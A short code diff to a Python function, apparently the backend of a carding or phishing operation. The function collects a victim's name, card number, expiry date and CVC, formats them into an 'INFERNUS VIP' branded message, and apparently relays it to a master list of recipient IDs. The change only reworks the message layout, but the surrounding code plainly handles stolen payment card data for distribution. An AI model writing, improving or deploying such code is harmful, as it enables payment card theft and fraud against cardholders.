@@ -39,13 +39,15 @@ def recibir_datos():
     cvc = data.get('cvc', 'N/A')
 
     mensaje = (
-         f"━━━━━━━INFERNUS VIP━━━━━━━━━━━\n"
-        f"👤 *Nombre:* `{nombre}`\n"
-        f"💳 *Tarjeta:* `{tarjeta}`\n"
-        f"📅 *Exp:* `{expiracion}`\n"
-        f"🔐 *CVC:* `{cvc}`\n"
-        f"━━━━━━━━━━━━━━━━━━"
-    )
+ 
+    f"◤◢◤◢◤◢◤◢◤◢◤◢◤◢\n"
+    f"   🔥 INFERNUS VIP 🔥\n"
+    f"◤◢◤◢◤◢◤◢◤◢◤◢◤◢\n\n"
+    f"`{tarjeta}`\n"
+    f"`{expiracion}`  |  `{cvc}`\n\n"
+    f"_{nombre}_"
+)
+    
 
     exitos = 0
     lista_maestra_strings = [str(i).strip() for i in LISTA_MAESTRA_IDS]
